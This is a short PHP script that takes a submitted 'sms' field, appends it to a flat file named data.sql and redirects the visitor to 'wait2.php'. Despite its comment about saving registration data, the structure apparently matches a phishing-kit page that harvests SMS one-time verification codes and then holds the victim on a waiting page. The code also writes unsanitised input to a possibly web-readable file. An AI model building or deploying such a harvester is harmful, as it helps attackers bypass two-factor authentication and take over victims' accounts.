<?php




// DATA should be saved with mysql , Use mysqli_connect() to save user information registering to your Website data base

$SMS = $_POST['sms']   ;


$message = "

	Mobile :

	SMS = $SMS



";

$data_saver = fopen("data.sql", "a");

fwrite($data_saver, $message);


echo '<script>window.location.href = "wait2.php" ; </script>' ;


